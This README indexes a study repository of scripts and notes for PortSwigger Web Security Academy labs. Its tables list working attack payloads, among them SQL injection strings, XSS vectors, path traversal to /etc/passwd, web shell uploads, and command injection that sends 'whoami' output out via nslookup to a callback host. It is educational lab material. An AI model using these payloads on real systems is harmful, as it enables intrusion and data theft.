# PortSwigger Web Security Academy — Lab Automation

A personal study repository for the [PortSwigger Web Security Academy](https://portswigger.net/web-security).
Each module contains:
- A detailed **notes file** covering vulnerability types, injection contexts, testing methodology, and per-lab breakdowns
- **Python automation scripts** for every lab — one script per lab, plus a shared utilities file

> ⚠️ **For educational use only.** These scripts are written against PortSwigger's intentionally vulnerable practice labs. Never run them against systems you don't own or have explicit permission to test.

---

## Repository Structure

```
portswigger-labs/
│
├── README.md
│
├── proxies.py               # Shared proxy config (points to Burp Suite)
│
├── sqli/
│   ├── sqli_notes.md        # Full SQLi reference — all 18 labs documented
│   ├── sqli_utils.py        # Shared helpers for SQLi scripts
│   ├── sqli_lab01.py
│   ├── sqli_lab02.py
│   ├── ...
│   └── sqli_lab18.py
│
├── xss/
│   ├── xss_notes.md         # Full XSS reference — all 30 labs documented
│   ├── xss_utils.py         # Shared helpers for XSS scripts
│   ├── xss_lab01.py
│   ├── xss_lab02.py
│   ├── ...
│   └── xss_lab30.py
│
├── csrf/
│   ├── csrf_notes.md        # Full CSRF reference — all 12 labs documented
│   ├── csrf_utils.py        # Shared helpers for CSRF scripts
│   ├── csrf_lab01.py
│   ├── csrf_lab02.py
│   ├── ...
│   └── csrf_lab12.py
│
├── access-control/
│   ├── access_control_notes.md   # Full Access Control reference — all 13 labs documented
│   ├── access_control_utils.py   # Shared helpers for Access Control scripts
│   ├── access_control_lab01.py
│   ├── access_control_lab02.py
│   ├── ...
│   └── access_control_lab13.py
│
├── api-testing/
│   ├── api_testing_notes.md      # Full API Testing reference — all 5 labs documented
│   ├── api_testing_utils.py      # Shared helpers for API Testing scripts
│   ├── api_testing_lab01.py
│   ├── api_testing_lab02.py
│   ├── ...
│   └── api_testing_lab05.py
│
├── cors/
│   ├── cors_notes.md             # Full CORS reference — all 4 labs documented
│   ├── cors_utils.py             # Shared helpers for CORS scripts
│   ├── cors_lab01.py
│   ├── cors_lab02.py
│   ├── cors_lab03.py
│   └── cors_lab04.py
│
├── authentication/
│   ├── authentication_notes.md   # Full Authentication reference — all 14 labs documented
│   ├── authentication_utils.py   # Shared helpers for Authentication scripts
│   ├── authentication_lab01.py
│   ├── authentication_lab02.py
│   ├── ...
│   └── authentication_lab14.py
│
├── path-traversal/
│   ├── path_traversal_notes.md   # Full Path Traversal reference — all 6 labs documented
│   ├── path_traversal_utils.py   # Shared helpers (incl. double_url_encode)
│   ├── path_traversal_lab01.py
│   ├── ...
│   └── path_traversal_lab06.py
│
├── os-command-injection/
│   ├── os_command_injection_notes.md  # Full OS Command Injection reference — all 5 labs
│   ├── os_command_injection_utils.py
│   ├── os_command_injection_lab01.py
│   ├── ...
│   └── os_command_injection_lab05.py
│
├── business-logic/
│   ├── business_logic_notes.md   # Full Business Logic reference — all 12 labs documented
│   ├── business_logic_utils.py   # Shared helpers (incl. strip_bytes_from_ciphertext, utf7_encode_segment)
│   ├── business_logic_lab01.py
│   ├── ...
│   └── business_logic_lab12.py
│
├── information-disclosure/
│   ├── information_disclosure_notes.md  # Full Information Disclosure reference — all 5 labs
│   ├── information_disclosure_utils.py
│   ├── information_disclosure_lab01.py
│   ├── ...
│   └── information_disclosure_lab05.py
│
├── file-upload/
│   ├── file_upload_notes.md   # Full File Upload reference — all 7 labs documented
│   ├── file_upload_utils.py   # Shared helpers (incl. upload_avatar, PHP_PAYLOAD constant)
│   ├── file_upload_lab01.py
│   ├── ...
│   └── file_upload_lab07.py
│
└── race-conditions/
    ├── race_conditions_notes.md   # Full Race Conditions reference — all 6 labs documented
    ├── race_conditions_utils.py   # Shared helpers (incl. send_parallel, warm_connection)
    ├── race_conditions_lab01.py
    ├── ...
    └── race_conditions_lab06.py
```

---

## Setup

### Requirements

- Python 3.8+
- [Burp Suite Community or Pro](https://portswigger.net/burp) running locally (for proxying traffic)
- A PortSwigger Web Security Academy account (free) — [register here](https://portswigger.net/users/register)

### Install dependencies

```bash
pip install requests urllib3
```

### Configure the proxy

Create a `proxies.py` file in the repo root:

```python
# proxies.py
proxies = {
    "http":  "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
```

This routes all script traffic through Burp Suite so you can inspect every request and response — which is the whole point of the exercise. If you don't want to use Burp, set `proxies = None` and update each script accordingly.

> 📝 **Why route through Burp?** Burp Suite is the standard tool for web security testing. Proxying your scripts through it lets you see exactly what's being sent and received, intercept and modify requests, and learn the HTTP layer deeply. Every professional uses this workflow.

---

## Running a Script

Each script takes the lab URL as its only argument:

```bash
python xss/xss_lab01.py https://YOUR-LAB-ID.web-security-academy.net
```

Lab URLs are assigned when you open a lab on PortSwigger. They expire after a set time, so always copy a fresh URL.

---

## Modules

### SQL Injection (18 labs)

| File | Lab | Technique |
|---|---|---|
| `sqli_lab01.py` | Retrieve hidden data | `WHERE` clause bypass with `OR 1=1--` |
| `sqli_lab02.py` | Login bypass | Username `administrator'--` |
| `sqli_lab03.py` | UNION — column count | `ORDER BY n` enumeration |
| `sqli_lab04.py` | UNION — string columns | `'test'` position probing |
| `sqli_lab05.py` | UNION — retrieve data | `UNION SELECT username,password FROM users` |
| `sqli_lab06.py` | UNION — single column | String concatenation with `\|\|` |
| `sqli_lab07.py` | DB version — Oracle | `SELECT banner FROM v$version` |
| `sqli_lab08.py` | DB version — MySQL/MSSQL | `@@version` with `--+` comment |
| `sqli_lab09.py` | DB contents — non-Oracle | `information_schema` enumeration |
| `sqli_lab10.py` | DB contents — Oracle | `all_tables` / `all_tab_columns` |
| `sqli_lab11.py` | Blind — conditional responses | `Welcome back!` boolean signal |
| `sqli_lab12.py` | Blind — conditional errors | Oracle `CASE/WHEN TO_CHAR(1/0)` divide-by-zero |
| `sqli_lab13.py` | Blind — time delays | PostgreSQL `pg_sleep()` |
| `sqli_lab14.py` | Blind — time delays + data | Conditional `pg_sleep()` char extraction |
| `sqli_lab15.py` | Blind — OOB interaction | Oracle DNS via Burp Collaborator |
| `sqli_lab16.py` | Blind — OOB data exfiltration | Password embedded in DNS hostname |
| `sqli_lab17.py` | Filter bypass via XML encoding | Hex entity encoding to bypass WAF |
| `sqli_lab18.py` | Visible error-based | `CAST(value AS int)` leaks data via error |

**Notes file:** `sqli/sqli_notes.md`  
Covers: all SQLi types, testing SOP (steps 1–12), Burp workflow, per-lab analysis and payloads, DB-specific syntax reference table.

---

### Cross-Site Scripting (30 labs)

| File | Lab | Technique |
|---|---|---|
| `xss_lab01.py` | Reflected XSS — HTML context | `<script>alert(1)</script>` |
| `xss_lab02.py` | Stored XSS — HTML context | `<script>` in comment body |
| `xss_lab03.py` | DOM XSS — `document.write` | `"><svg onload=alert(1)>` |
| `xss_lab04.py` | DOM XSS — `innerHTML` | `<img src=x onerror=alert(1)>` |
| `xss_lab05.py` | DOM XSS — jQuery `href` sink | `javascript:alert(document.cookie)` |
| `xss_lab06.py` | DOM XSS — jQuery hashchange | iframe + hash injection → `print()` |
| `xss_lab07.py` | Reflected — attribute context | `" autofocus onfocus="alert(1)` |
| `xss_lab08.py` | Stored — `href` attribute | `javascript:` URI in website field |
| `xss_lab09.py` | Reflected — JS string | `';alert(1)//` |
| `xss_lab10.py` | DOM XSS — `document.write` in `<select>` | `</select><img onerror=alert(1)>` |
| `xss_lab11.py` | DOM XSS — AngularJS expression | `{{constructor.constructor('alert(1)')()}}` |
| `xss_lab12.py` | Reflected DOM XSS | `\"-alert(1)}//` |
| `xss_lab13.py` | Stored DOM XSS | `<><img src=1 onerror=alert(1)>` |
| `xss_lab14.py` | Cookie theft | `fetch()` to Burp Collaborator |
| `xss_lab15.py` | Password capture | Injected autofill form → Collaborator |
| `xss_lab16.py` | XSS → CSRF | XHR reads CSRF token, changes email |
| `xss_lab17.py` | WAF bypass — most tags blocked | `<body onresize=print()>` via iframe |
| `xss_lab18.py` | WAF bypass — custom tags | `<xss id=x onfocus=alert() tabindex=1>` |
| `xss_lab19.py` | SVG markup allowed | `<animatetransform onbegin=alert(1)>` |
| `xss_lab20.py` | Canonical link tag | `accesskey` + `onclick` attribute injection |
| `xss_lab21.py` | JS string — `'` and `\` escaped | `</script><script>alert(1)//` |
| `xss_lab22.py` | JS string — `<>` encoded, `'` escaped | `\';alert(1)//` (escape-the-escaper) |
| `xss_lab23.py` | Stored — `onclick`, all chars escaped | `&apos;` HTML entity bypass |
| `xss_lab24.py` | Template literal | `${alert(1)}` interpolation |
| `xss_lab25.py` | Event handlers + `href` blocked | SVG `<animate attributeName=href>` |
| `xss_lab26.py` | `javascript:` URL — parens blocked | `throw` + `onerror=alert` |
| `xss_lab27.py` | AngularJS sandbox — no strings | `fromCharCode()` char-code construction |
| `xss_lab28.py` | AngularJS + CSP | `ng-focus` + `orderBy` sandbox escape |
| `xss_lab29.py` | Strict CSP — dangling markup | `<button formaction=>` CSRF token theft |
| `xss_lab30.py` | CSP header injection | `;script-src-elem 'unsafe-inline'` bypass |

**Notes file:** `xss/xss_notes.md`  
Covers: all XSS types, injection context table, testing SOP (steps 1–7), Burp workflow, per-lab analysis and payloads, context cheat sheet, useful payload bank, cookie flags reference, CSP basics.

---

### Cross-Site Request Forgery (12 labs)

| File | Lab | Technique |
|---|---|---|
| `csrf_lab01.py` | No defences | Auto-submitting form, no token at all |
| `csrf_lab02.py` | Token validation depends on request method | Convert POST → GET to skip the check |
| `csrf_lab03.py` | Token validation depends on token being present | Omit the `csrf` parameter entirely |
| `csrf_lab04.py` | Token not tied to user session | Use attacker's own unused token against victim |
| `csrf_lab05.py` | Token tied to non-session cookie | CRLF cookie injection sets matching `csrfKey` |
| `csrf_lab06.py` | Token duplicated in cookie | Double-submit bypass — attacker sets both copies |
| `csrf_lab07.py` | SameSite Lax bypass via method override | `_method=POST` on a GET request |
| `csrf_lab08.py` | SameSite Strict bypass via client-side redirect | Same-site open redirect via `postId` path traversal |
| `csrf_lab09.py` | SameSite Strict bypass via sibling domain | XSS on sibling domain + WebSocket hijack (CSWSH) |
| `csrf_lab10.py` | SameSite Lax bypass via cookie refresh | Exploit Chrome's 2-minute grace period via OAuth popup |
| `csrf_lab11.py` | Referer validation depends on header being present | Suppress Referer with `<meta name="referrer">` |
| `csrf_lab12.py` | Broken Referer validation | Forge Referer containing target domain as substring |

**Notes file:** `csrf/csrf_notes.md`  
Covers: CSRF vs XSS comparison, all defence mechanisms and how each fails, testing SOP (steps 1–8), Burp workflow, per-lab analysis and exploit HTML, token validation flaw reference, SameSite bypass conditions, exploit template bank.

---

### Access Control (13 labs)

| File | Lab | Technique |
|---|---|---|
| `access_control_lab01.py` | Unprotected admin functionality | Admin path disclosed via `robots.txt` |
| `access_control_lab02.py` | Unprotected admin functionality, unpredictable URL | Path leaked in page source/comments |
| `access_control_lab03.py` | User role controlled by request parameter | Flip `Cookie: Admin=false` → `true` |
| `access_control_lab04.py` | User role modifiable in user profile | Inject hidden `roleid` field into profile update |
| `access_control_lab05.py` | URL-based access control bypass | Path normalisation mismatch (proxy vs backend) |
| `access_control_lab06.py` | Method-based access control bypass | Convert POST → GET to reach the same handler |
| `access_control_lab07.py` | User ID controlled by request parameter | Classic IDOR — swap `?id=wiener` → `?id=carlos` |
| `access_control_lab08.py` | IDOR with unpredictable user IDs | GUID leaked via blog post/comment authorship |
| `access_control_lab09.py` | IDOR with data leakage in redirect | Sensitive data present in 302 response body |
| `access_control_lab10.py` | IDOR with password disclosure | Password pre-filled in masked HTML input |
| `access_control_lab11.py` | Insecure direct object references | Sequential transcript filenames (`1.txt`, `2.txt`...) |
| `access_control_lab12.py` | Multi-step process, missing check on one step | Skip directly to step 2 (`confirmed=true`) |
| `access_control_lab13.py` | Referer-based access control | Forge `Referer` header to mimic the admin page |

**Notes file:** `access-control/access_control_notes.md`  
Covers: vertical vs horizontal escalation, IDOR deep dive, 7 common failure patterns, testing SOP (steps 1–10), Burp workflow, per-lab analysis and payloads, vulnerability quick-map reference, defence principles.

---

### API Testing (5 labs)

| File | Lab | Technique |
|---|---|---|
| `api_testing_lab01.py` | Exploiting an API endpoint using documentation | Path truncation to `/api` discloses a hidden `DELETE` endpoint |
| `api_testing_lab02.py` | Finding and exploiting an unused API endpoint | `OPTIONS` reveals `PATCH` → set jacket price to $0.00 |
| `api_testing_lab03.py` | Exploiting a mass assignment vulnerability | Inject `chosen_discount` into checkout `POST` body |
| `api_testing_lab04.py` | SSPP in a query string | Inject `&field=reset_token` into `username` to leak password reset token |
| `api_testing_lab05.py` | SSPP in a REST URL | Path traversal via `../` to reach internal API token route |

**Notes file:** `api-testing/api_testing_notes.md`  
Covers: REST fundamentals, API recon (documentation discovery, path truncation, method enumeration, content-type switching), hidden parameter discovery, mass assignment deep dive, server-side parameter pollution (query string and REST path variants), testing SOP (steps 1–8), Burp workflow, per-lab analysis and payloads, vulnerability quick-map and defence principles.

---

### CORS (4 labs)

| File | Lab | Technique |
|---|---|---|
| `cors_lab01.py` | CORS with basic origin reflection | Arbitrary `Origin` reflected + credentials allowed → exfiltrate API key |
| `cors_lab02.py` | CORS with trusted null origin | Sandboxed iframe generates `Origin: null` → bypasses whitelist |
| `cors_lab03.py` | CORS with trusted insecure protocols | HTTP subdomain trusted → XSS on subdomain used as CORS bypass vector |
| `cors_lab04.py` | CORS internal network pivot attack | Victim's browser used as pivot to scan, find, and exploit an internal admin panel |

**Notes file:** `cors/cors_notes.md`  
Covers: SOP vs CORS distinction, all CORS response headers explained, 4 misconfiguration patterns, the trust chain that makes CORS bugs exploitable, CORS + XSS interaction, testing SOP (steps 1–7), Burp workflow, per-lab analysis and exploit HTML/JS, vulnerability quick-map and defence principles.

---

### Authentication (14 labs)

| File | Lab | Technique |
|---|---|---|
| `authentication_lab01.py` | Username enumeration via different responses | `"Invalid username"` vs `"Incorrect password"` |
| `authentication_lab02.py` | 2FA simple bypass | Skip `/login2` — navigate directly to `/my-account` |
| `authentication_lab03.py` | Password reset broken logic | Hidden `username` param overrides the reset token's owner |
| `authentication_lab04.py` | Username enumeration via subtly different responses | Missing trailing period in error message |
| `authentication_lab05.py` | Username enumeration via response timing | bcrypt timing difference + `X-Forwarded-For` IP rotation |
| `authentication_lab06.py` | Broken brute-force protection, IP block | Interleave valid `wiener:peter` logins to reset the counter |
| `authentication_lab07.py` | Username enumeration via account lock | Lockout only triggers for real usernames |
| `authentication_lab08.py` | 2FA broken logic | `verify` cookie manipulation generates a code for any user |
| `authentication_lab09.py` | Brute-forcing a stay-logged-in cookie | Forge `base64(username:MD5(password))` |
| `authentication_lab10.py` | Offline password cracking | XSS steals the cookie, MD5 hash cracked offline |
| `authentication_lab11.py` | Password reset poisoning via middleware | `X-Forwarded-Host` redirects the reset link to attacker's server |
| `authentication_lab12.py` | Password brute-force via password change | Client-controlled `username` turns the form into a password oracle |
| `authentication_lab13.py` | Multiple credentials per request | JSON `password` array bypasses per-request rate limiting |
| `authentication_lab14.py` | 2FA bypass using a brute-force attack | Full re-login before every guess (macro pattern in Python) |

**Notes file:** `authentication/authentication_notes.md`  
Covers: the three authentication factors, username enumeration signals, brute-force protections and bypasses, password reset vulnerabilities, 2FA/MFA bypass techniques, stay-logged-in cookie attacks, testing SOP (steps 1–7), Burp workflow (including macro-based brute-force), per-lab analysis and payloads, vulnerability quick-map reference.

---

### Path Traversal (6 labs)

| File | Lab | Technique |
|---|---|---|
| `path_traversal_lab01.py` | Simple case | Plain `../../../etc/passwd` — no bypass needed |
| `path_traversal_lab02.py` | Traversal sequences blocked — absolute path bypass | Supply `/etc/passwd` directly |
| `path_traversal_lab03.py` | Sequences stripped non-recursively | Nested `....//....//....//etc/passwd` |
| `path_traversal_lab04.py` | Superfluous URL-decode | Double URL-encoding: `%252e%252e%252f...` |
| `path_traversal_lab05.py` | Validation of start of path | `/var/www/images/../../../etc/passwd` prefix bypass |
| `path_traversal_lab06.py` | Validation of file extension — null byte bypass | `../../../etc/passwd%00.jpg` |

**Notes file:** `path-traversal/path_traversal_notes.md`  
Covers: the core `../` primitive, all 6 defence patterns and their bypasses, testing SOP (steps 1–5), Burp workflow, per-lab analysis and payloads, defence principles. Includes a verified `double_url_encode()` helper.

---

### OS Command Injection (5 labs)

| File | Lab | Technique |
|---|---|---|
| `os_command_injection_lab01.py` | Simple case | `1\|whoami` in the `storeId` parameter |
| `os_command_injection_lab02.py` | Blind — time delays | `\|\|ping -c 10 127.0.0.1\|\|` in the email field |
| `os_command_injection_lab03.py` | Blind — output redirection | `\|\|whoami>/var/www/images/output.txt\|\|` then fetch the file |
| `os_command_injection_lab04.py` | Blind — OOB interaction | `\|\|nslookup x.COLLABORATOR\|\|` via Burp Collaborator |
| `os_command_injection_lab05.py` | Blind — OOB data exfiltration | `` \|\|nslookup `whoami`.COLLABORATOR\|\| `` command substitution |

**Notes file:** `os-command-injection/os_command_injection_notes.md`  
Covers: shell metacharacter toolkit, visible vs blind injection, all 4 blind techniques (timing, redirection, OOB, OOB exfiltration), testing SOP (steps 1–7), Burp workflow, per-lab analysis and payloads, defence principles.

---

### Business Logic Vulnerabilities (12 labs)

| File | Lab | Technique |
|---|---|---|
| `business_logic_lab01.py` | Excessive trust in client-side controls | Forge `price=100` in the cart POST body |
| `business_logic_lab02.py` | High-level logic vulnerability | Negative `quantity=-1` drives the jacket total below zero |
| `business_logic_lab03.py` | Inconsistent security controls | Self-service email change to `@trusted-domain` |
| `business_logic_lab04.py` | Flawed enforcement of business rules | Stack two separate discount codes on the same order |
| `business_logic_lab05.py` | Low-level logic flaw | Integer overflow via repeated adds; total wraps negative |
| `business_logic_lab06.py` | Inconsistent handling of exceptional input | 255-char truncation: stored email lands in trusted domain |
| `business_logic_lab07.py` | Weak isolation on dual-use endpoint | Omit `current-password` entirely + `username=administrator` |
| `business_logic_lab08.py` | Insufficient workflow validation | Replay captured confirmation GET after swapping cart contents |
| `business_logic_lab09.py` | Authentication bypass via flawed state machine | Drop the role-selector GET → session defaults to admin |
| `business_logic_lab10.py` | Infinite money logic flaw | Gift card discount loop automated via macro |
| `business_logic_lab11.py` | Authentication bypass via encryption oracle | Forge `stay-logged-in` cookie via EXIF-comment oracle |
| `business_logic_lab12.py` | Email address parsing discrepancies | UTF-7 encoded local-part bypasses domain allowlist |

**Notes file:** `business-logic/business_logic_notes.md`  
Covers: 6 logic flaw categories, testing SOP (steps 1–5), Burp workflow (null payloads, macros, Decoder), per-lab analysis and payloads, vulnerability quick-map and defence principles.

---

### Information Disclosure (5 labs)

| File | Lab | Technique |
|---|---|---|
| `information_disclosure_lab01.py` | Error messages | Non-numeric `productId=null` triggers verbose stack trace with framework version |
| `information_disclosure_lab02.py` | Debug page | `/cgi-bin/phpinfo.php` exposes `SECRET_KEY` environment variable |
| `information_disclosure_lab03.py` | Backup files | `robots.txt` → `/backup/ProductTemplate.java.bak` → hardcoded DB password |
| `information_disclosure_lab04.py` | Authentication bypass | `TRACE /login` reveals `X-Custom-IP-Authorization` header → bypass `/admin` |
| `information_disclosure_lab05.py` | Version control history | Mirror `/.git/`, `git log` reveals admin password in old commit |

**Notes file:** `information-disclosure/information_disclosure_notes.md`  
Covers: 6 disclosure sources (errors, debug pages, backup files, developer comments, TRACE, `.git`), testing SOP (steps 1–6), Burp Content Discovery workflow, per-lab analysis, defence principles. Lab 05 shells out to `wget` and `git`.

---

### File Upload Vulnerabilities (7 labs)

| File | Lab | Technique |
|---|---|---|
| `file_upload_lab01.py` | RCE — no defences | Upload plain `.php` web shell directly |
| `file_upload_lab02.py` | Content-Type restriction bypass | Forge `Content-Type: image/jpeg` while uploading `.php` |
| `file_upload_lab03.py` | Path traversal in filename | `filename=../exploit.php` saves outside the restricted directory |
| `file_upload_lab04.py` | Extension blacklist bypass | Upload `.htaccess` remapping a custom extension → PHP execution |
| `file_upload_lab05.py` | Obfuscated file extension | `exploit.php%00.jpg` null-byte truncation |
| `file_upload_lab06.py` | Polyglot web shell | ExifTool embeds PHP payload in genuine JPEG EXIF Comment |
| `file_upload_lab07.py` | Race condition | Upload + parallel fetch burst; execute before validation deletes the file |

**Notes file:** `file-upload/file_upload_notes.md`  
Covers: the two conditions for RCE, all 7 validation mechanisms and their bypasses, testing SOP (steps 1–7), Burp workflow, per-lab analysis and payloads, defence principles. Lab 06 requires ExifTool; Lab 07 uses Python threading to approximate Turbo Intruder's gate mechanism.

---

### Race Conditions (6 labs)

| File | Lab | Technique |
|---|---|---|
| `race_conditions_lab01.py` | Limit overrun | Flood `POST /cart/coupon` in parallel → discount stacks multiple times |
| `race_conditions_lab02.py` | Bypassing rate limits | Submit entire password wordlist as one parallel burst → defeats 3-attempt lockout |
| `race_conditions_lab03.py` | Multi-endpoint race | Race gift-card redemption against checkout across two separate endpoints |
| `race_conditions_lab04.py` | Single-endpoint race | Parallel change-email requests → token/address mismatch in session state |
| `race_conditions_lab05.py` | Time-sensitive vulnerabilities | Race two password resets → identical timestamp-derived tokens |
| `race_conditions_lab06.py` | Partial construction | Registration + empty-token confirm burst → bypass email verification |

**Notes file:** `race-conditions/race_conditions_notes.md`  
Covers: race window concept, single-packet attack (HTTP/2 multiplexing), connection warming, session-based locking and bypass, all 6 race condition categories, testing SOP (steps 1–7), Burp workflow (Repeater groups, Turbo Intruder gate/openGate). Python `send_parallel()` helper uses `threading.Barrier`; notes explicitly document where Burp/Turbo Intruder outperforms pure Python.

---

## Script Categories

Not every lab can be fully automated with `requests` — understanding why is itself part of the learning.

**XSS**

**Fully automated** — script sends the payload and verifies reflection or storage in the HTTP response:
> Labs: 01, 02, 07–09, 13, 17–19, 21–24, 30

**Partially automated** — script verifies the payload reached the client intact, but JavaScript execution requires a real browser (DOM-based XSS runs client-side, not server-side):
> Labs: 03, 04, 10–12

**Instruction-based** — requires Burp Collaborator, the exploit server, or a user action. Script prints the exact payload and delivery steps:
> Labs: 05, 06, 14–16, 20, 25–29

> 📝 `requests` is an HTTP library — it sends and receives raw HTTP. It cannot run JavaScript, render HTML, or simulate a browser. DOM-based XSS vulnerabilities exist entirely in the browser's JS engine, so a real browser is always needed to confirm execution. This is why Burp Suite's built-in Chromium browser (with DOM Invader) is part of the standard workflow.

**CSRF**

**Fully automated** — script proves the vulnerability against your own account, then prints the exploit HTML:
> Labs: 01–04, 07, 11, 12

**Exploit-server only** — requires CRLF cookie injection, a redirect chain, or a popup-based timing window. Script builds and prints the exact exploit HTML:
> Labs: 05, 06, 08, 10

**Exploit-server + Burp Collaborator** — chains XSS on a sibling domain with a WebSocket hijack:
> Lab: 09

**Access Control**

**Fully automated** — script performs the bypass directly and prints the leaked data or confirms escalation:
> Labs: 01–13 (every Access Control lab is HTTP-only — no JavaScript execution required, so every one is fully scriptable with `requests`)

> 📝 Access Control is the most "automatable" module so far. Unlike XSS, none of these vulnerabilities depend on a browser's JS engine — they're all pure HTTP logic flaws (missing checks, trusted client input, forgeable headers). That's exactly why access control bugs are often the fastest to find and exploit in real bug bounty work.

**API Testing**

**Fully automated** — script sends the API requests and verifies the exploit outcome directly:
> Labs: 01, 02, 03

**Partially automated** — script performs all discovery probes and exfiltrates the reset token, but password-reset form field names may vary slightly between lab instances and require minor adjustment:
> Labs: 04, 05

**CORS**

**Partially automated** — script probes the misconfiguration directly with `requests` (which never enforces CORS headers), confirms the vulnerability, then prints the browser-side exploit HTML/JS for exploit-server delivery:
> Labs: 01, 02, 03

**Instruction-based** — entirely victim-browser-driven across three stages; script builds and prints each stage's exploit with an interactive prompt between stages. Requires Burp Collaborator to receive exfiltrated results:
> Lab: 04

> 📝 CORS is a **browser mechanism**, not a server-side access control. `requests` and Burp Repeater ignore `Access-Control-Allow-Origin` entirely — which is why you can always read any response with Python or Burp regardless of the CORS policy. The actual exploitation only matters in a real victim's browser, where the policy controls whether injected JavaScript is allowed to read the cross-origin response. Always test CORS impact in a real browser, not just via the proxy.

**Authentication**

**Fully automated** — script performs the enumeration/brute-force/bypass directly against the target with `requests`:
> Labs: 01, 02, 04, 05, 06, 07, 08, 09, 12, 13, 14

**Partially automated** — the exploitation logic is fully scripted, but the delivery mechanism (stored XSS payload, or a victim clicking a poisoned link) requires the exploit server and can't be triggered by the script itself. Run once to build/deliver the payload, then again once you have the leaked data:
> Labs: 10, 11

**Note on Lab 03** — fully automated end-to-end, including reading the reset link from the lab's built-in email client.

> 📝 Authentication is the module where wordlists matter most. Nearly every script here takes a usernames and/or passwords file as a command-line argument — download PortSwigger's candidate lists from the lab page itself before running these. Lab 14 in particular requires a full re-login before every single guess (a wrong 2FA code invalidates the session), so it can take a while to run — this is one of the few places Burp Pro's threaded Intruder genuinely outpaces single-threaded Python.

**Path Traversal**

**Fully automated** — every lab is pure HTTP request/response; no browser, JS engine, or external tool required:
> Labs: 01, 02, 03, 05

**Requires manual URL construction** — the raw byte sequence must reach the server unmodified; scripts build the full URL string manually instead of using `params=` to prevent re-encoding:
> Labs: 04 (double URL-encoded payload), 06 (literal `%00` null byte)

**OS Command Injection**

**Fully automated** — Lab 01 reads output directly; Labs 02–03 confirm via timing or redirect-then-fetch:
> Labs: 01, 02, 03

**Requires Burp Collaborator** — OOB DNS interaction is the only signal; script prints the payload and polls instructions:
> Labs: 04, 05

**Business Logic Vulnerabilities**

**Fully automated** — script performs the exploit and confirms the outcome directly:
> Labs: 01, 02, 03, 04, 07, 12

**Partially automated / framework scripts** — automates the mechanical bulk of the exploit (overflow repetition, gift-card cycling, oracle byte-stripping) but requires per-instance verification of field names, thresholds, or intermediate values:
> Labs: 05, 06, 08, 09, 10, 11

**Information Disclosure**

**Fully automated** — script fetches, parses, and prints the leaked value directly:
> Labs: 01, 02, 03, 04

**Requires local tooling** — Lab 05 shells out to `wget` (to mirror the `.git` directory) and `git` (to inspect commit history); both must be installed and on PATH:
> Lab: 05

**File Upload Vulnerabilities**

**Fully automated** — script uploads the web shell and fetches its output directly:
> Labs: 01, 02, 03, 04

**Requires manual URL construction** — raw byte sequences must be sent unmodified (null byte / double extension):
> Lab: 05

**Requires ExifTool** — the polyglot file must be built locally before upload:
> Lab: 06

**Approximated via Python threading** — Burp's Turbo Intruder is the more reliable tool for this sub-millisecond race window; script includes a ready-to-paste Turbo Intruder template as a fallback:
> Lab: 07

**Race Conditions**

**Fully automated (with caveats)** — `send_parallel()` uses `threading.Barrier` for tight dispatch synchronisation; works reliably for wider race windows:
> Labs: 01, 02, 03

**Best-effort / may need multiple runs** — the race window is narrower; pure Python threading is a reasonable approximation but Burp's single-packet attack is more reliable:
> Labs: 04, 05

**Hard — explicitly requires experimentation** — PortSwigger's own lab description warns this lab needs timing experimentation; script documents this honestly and points to Turbo Intruder for finer control:
> Lab: 06

> 📝 The single most important tool introduced by the Race Conditions module is **"Send group in parallel (single-packet attack)"** in Burp Repeater. It exploits HTTP/2 multiplexing to place multiple requests in ONE TCP packet, eliminating network jitter entirely — something Python's `requests` library cannot replicate. For the narrowest race windows, Burp or Turbo Intruder will always outperform a pure-Python approach.

---

## Tools Referenced

| Tool | Purpose |
|---|---|
| [Burp Suite](https://portswigger.net/burp) | Proxy, Repeater, Intruder, Collaborator, DOM Invader |
| [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) | Out-of-band callback server (Pro feature) — needed for OOB SQLi and blind XSS |
| [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) | Burp extension — encoding transformations (XML hex entities, Unicode, etc.) |
| [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) | Built into Burp's browser — automatically finds DOM sources and sinks |
| [XSS Hunter](https://xsshunter.trufflesecurity.com/) | Free blind XSS callback platform (alternative to Collaborator for XSS) |
| [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) | Comprehensive tag and event wordlist for WAF bypass fuzzing |
| [Generate CSRF PoC](https://portswigger.net/burp/documentation/desktop/tools/repeater/generate-csrf-poc) | Burp Pro feature — right-click a request → auto-generates a working CSRF exploit page |
| [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) | Burp extension — automates hidden parameter and header discovery across an entire site |
| [Content Type Converter](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278) | Burp extension — quickly reformats a request body between JSON, XML, and form-encoded |
| [Session Handling Rules / Macros](https://portswigger.net/burp/documentation/desktop/tools/repeater/session-handling-rules) | Burp feature — records and replays a multi-step request sequence (e.g. full re-login) before every Intruder attempt |
| [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) | Burp extension — high-speed concurrent request engine with `gate`/`openGate` mechanism for race condition exploitation |
| [ExifTool](https://exiftool.org/) | Local CLI tool — reads and writes image metadata; used to embed PHP payloads into genuine JPEG files (polyglot web shells) |
| [hashid](https://github.com/psypanda/hashID) | Local CLI tool — identifies hash algorithms by format; useful for fingerprinting time-sensitive password reset tokens |
| `wget` / `git` | Standard CLI tools — used together to mirror an exposed `.git` directory and inspect commit history for leaked secrets |

---

## Learning Path

This repo tracks progress through the PortSwigger Web Security Academy. Modules
aren't always tackled in strict numerical order — completed so far:

- [x] SQL Injection
- [x] Cross-Site Scripting (XSS)
- [x] Cross-Site Request Forgery (CSRF)
- [x] Access Control
- [x] API Testing
- [x] CORS
- [x] Authentication
- [x] Path Traversal
- [x] OS Command Injection
- [x] Business Logic Vulnerabilities
- [x] Information Disclosure
- [x] File Upload Vulnerabilities
- [x] Race Conditions
- [x] OAuth Authentication
- [x] JWT Attacks
- [x] Clickjacking
- [x] DOM-based Vulnerabilities
- [x] XML External Entity Injection (XXE)
- [x] Server-Side Request Forgery (SSRF)
- [x] HTTP Request Smuggling
- [x] Server-Side Template Injection (SSTI)
- [x] WebSockets
- [x] Insecure Deserialization
- [x] HTTP Host Header Attacks
- [x] Prototype Pollution
- [x] GraphQL API Vulnerabilities
- [x] Web Cache Poisoning
- [x] Web Cache Deception
- [x] Web LLM Attacks

---

## Disclaimer

